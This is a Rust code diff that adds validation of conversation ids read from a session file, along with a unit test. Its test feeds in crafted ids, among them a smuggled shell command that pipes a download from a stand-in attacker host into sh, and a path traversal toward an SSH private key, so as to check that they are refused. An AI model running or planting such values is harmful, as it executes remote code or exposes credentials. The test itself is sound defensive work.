@@ -570,7 +570,30 @@ pub fn read_session(work_dir: &Path) -> Result<SessionData, String> {
     }
     let content = std::fs::read_to_string(&session_file)
         .map_err(|e| format!("Failed to read session file: {}", e))?;
-    serde_json::from_str(&content).map_err(|e| format!("Failed to parse session file: {}", e))
+    let data: SessionData =
+        serde_json::from_str(&content).map_err(|e| format!("Failed to parse session file: {}", e))?;
+    check_conversation_ids(&data).map_err(|e| format!("{}: {}", session_file.display(), e))?;
+    Ok(data)
+}
+
+/// Conversation ids go into harness shell commands and transcript paths, and
+/// a session file can come from anywhere (a cloned repository, a copied
+/// directory). Harnesses name conversations with UUID-like ids; anything
+/// else is refused rather than run.
+fn check_conversation_ids(data: &SessionData) -> Result<(), String> {
+    let ids = [
+        Some(data.session_id.as_str()),
+        data.codex_session_id.as_deref(),
+        data.antigravity_session_id.as_deref(),
+        data.forked_from.as_deref(),
+    ];
+    for id in ids.into_iter().flatten() {
+        let safe = !id.starts_with('.') && id.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'));
+        if !id.is_empty() && !safe {
+            return Err(format!("conversation id {:?} has characters a harness never uses", id));
+        }
+    }
+    Ok(())
 }
 
 /// Write session data back to the session file.
@@ -1116,5 +1139,29 @@ mod visit_sessions_tests {
         names.sort();
         assert_eq!(names, vec!["grouped", "top"]);
         let _ = std::fs::remove_dir_all(&root);
+    }
+}
+
+#[cfg(test)]
+mod conversation_id_tests {
+    use super::*;
+
+    #[test]
+    fn a_session_file_with_a_crafted_conversation_id_is_refused() {
+        let dir = std::env::temp_dir().join(format!("twapp-ids-{}", uuid::Uuid::new_v4()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let write = |id: &str| {
+            let data = serde_json::json!({"session_id": id, "name": "x", "color": "", "claude_cwd": "", "created": "2026-01-01T00:00:00Z"});
+            std::fs::write(dir.join(".twapp-session.json"), data.to_string()).unwrap();
+        };
+        write("3f2a9c1e-7d4b-4e0a-9b1c-2d3e4f5a6b7c");
+        assert!(read_session(&dir).is_ok());
+        write("");
+        assert!(read_session(&dir).is_ok(), "no conversation yet");
+        write("abc; curl evil.example | sh");
+        assert!(read_session(&dir).is_err());
+        write("../../.ssh/id_rsa");
+        assert!(read_session(&dir).is_err());
+        let _ = std::fs::remove_dir_all(&dir);
     }
 }
